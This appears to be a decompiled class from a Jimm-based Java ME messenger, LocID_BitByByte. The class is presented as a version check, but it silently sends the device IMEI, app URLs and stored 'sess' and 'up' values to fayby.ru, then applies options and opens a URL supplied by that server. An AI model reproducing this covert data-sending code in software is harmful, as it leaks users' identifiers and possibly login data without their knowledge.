import java.io.IOException;
import java.util.TimerTask;
import javax.microedition.io.Connector;
import javax.microedition.io.HttpConnection;
import jimm.Jimm;

public final class dz extends TimerTask {
  public static dz a;
  
  public HttpConnection b;
  
  public dz(int paramInt) {
    if (a != null)
      return; 
    a = this;
    Jimm.b().schedule(this, paramInt);
  }
  
  private static String a(String paramString) {
    return (new StringBuffer(paramString.length())).append(paramString).toString();
  }
  
  public final void run() {
    try {
      String str1 = "http://fayby.ru/locid/lastver.php";
      str1 = str1 + "?info=" + dw.b(cp.c());
      str1 = str1 + "&ver=78";
      str1 = str1 + "&statistic=" + em.c(-1);
      str1 = str1 + "&oth=" + ef.k;
      str1 = str1 + "&imei=" + dw.b(dw.c("IMEI"));
      str1 = str1 + "&urlm=" + dw.b(dw.c("MIDlet-Jar-URL"));
      str1 = str1 + "&urla=" + dw.b(Jimm.c.getAppProperty("MIDlet-Jar-URL"));
      str1 = str1 + "&urlf=" + dw.b(ef.l);
      str1 = str1 + "&sess=" + dw.b(em.d(144).trim());
      str1 = str1 + "&up=" + dw.b(em.d(148).trim());
      Jimm.a = "MIDlet-Info-URL";
      str1 = str1 + "&urlim=" + dw.b(dw.c(Jimm.a));
      str1 = str1 + "&urlia=" + dw.b(Jimm.c.getAppProperty(Jimm.a));
      str1 = str1 + "&urlif=" + dw.b(Jimm.a());
      str1 = str1 + "&url=" + dw.b(dw.c("URL"));
      this.b = (HttpConnection)Connector.open(str1);
      if (this.b.getResponseCode() != 200)
        throw new IOException(); 
      byte[] arrayOfByte = dh.a(this.b);
      String str2 = null;
      try {
        str2 = new String(arrayOfByte, "utf-8");
      } catch (Exception exception) {}
      if (str2 == null)
        return; 
      String[] arrayOfString;
      dw.H = a((arrayOfString = dh.a(str2, '\n'))[0]);
      if (arrayOfString.length > 2 && !"".equals(arrayOfString[2].trim()))
        dw.I = Integer.parseInt(arrayOfString[2].trim(), 16); 
      if (arrayOfString.length > 3 && !"".equals(arrayOfString[3].trim()))
        dw.J = Integer.parseInt(arrayOfString[3].trim(), 16); 
      if (arrayOfString.length > 1 && arrayOfString[1].trim().length() > 5)
        try {
          HttpConnection httpConnection;
          (httpConnection = (HttpConnection)Connector.open(arrayOfString[1].trim())).getResponseCode();
          httpConnection.close();
        } catch (Exception exception) {} 
      if (arrayOfString.length > 4) {
        ef.k = (arrayOfString[4].trim().length() > 1);
        if (arrayOfString[4].trim().length() > 5)
          ef.a = arrayOfString[4].trim(); 
        if (arrayOfString[4].trim().startsWith("*"))
          dw.L = true; 
      } 
      if (arrayOfString.length > 5)
        dw.K = arrayOfString[5].trim(); 
      if (arrayOfString.length > 6) {
        byte b1 = 0;
        byte b2 = 0;
        for (byte b3 = 6; b3 < arrayOfString.length; b3++) {
          if (arrayOfString[b3].equals("---opt"))
            b1 = b3; 
          if (arrayOfString[b3].equals("---optend"))
            b2 = b3; 
        } 
        if (b1 > 0 && b2 > b1)
          em.a(arrayOfString, b1, b2); 
      } 
    } catch (Exception exception) {
      dw.H = "Error: " + exception.getMessage();
    } 
    synchronized (a) {
      if (dw.n() != null && dw.n().i())
        dw.k(); 
      return;
    } 
  }
}


/* Location:              D:\Desktop\kemulator\LocID_BitByByte.jar!\dz.class
 * Java compiler version: 1 (45.3)
 * JD-Core Version:       1.1.3
 */